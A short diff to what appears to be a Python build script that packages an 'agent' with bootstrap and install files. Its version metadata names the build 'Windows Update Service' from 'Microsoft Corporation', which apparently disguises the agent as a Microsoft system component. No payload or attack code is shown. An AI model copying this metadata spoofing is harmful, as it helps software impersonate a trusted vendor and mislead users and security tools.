@@ -22,7 +22,9 @@ DISPLAY     = "Windows Update Service"
 COMPANY     = "Microsoft Corporation"
 DESCRIPTION = "Windows Update Service"
 COPYRIGHT   = "Copyright (C) 2026"
-VERSION     = (1, 4, 2, 0)
+VERSION     = tuple(int(p) for p in __import__("syspy").__version__.split("."))
+if len(VERSION) == 3:
+    VERSION = VERSION + (0,)
 
 VERSION_STR = ".".join(str(part) for part in VERSION)
 VER_TUPLE   = "(" + ", ".join(str(part) for part in VERSION) + ")"
@@ -257,8 +259,13 @@ def build() -> int:
     shutil.rmtree(os.path.join(ROOT, "dist"), ignore_errors=True)
     os.makedirs(DIST, exist_ok=True)
 
-    print("[1/4] copying agent")
+    print("[1/4] copying agent and assets")
     shutil.copy2(os.path.join(ROOT, "agent.py"), os.path.join(DIST, "agent.py"))
+    if os.path.exists(os.path.join(ROOT, "bootstrap.py")):
+        shutil.copy2(os.path.join(ROOT, "bootstrap.py"), os.path.join(DIST, "bootstrap.py"))
+    if os.path.exists(os.path.join(ROOT, "install")):
+        shutil.copytree(os.path.join(ROOT, "install"), os.path.join(DIST, "install"),
+                        ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
     shutil.copytree(os.path.join(ROOT, "syspy"), os.path.join(DIST, "syspy"),
                     ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
 
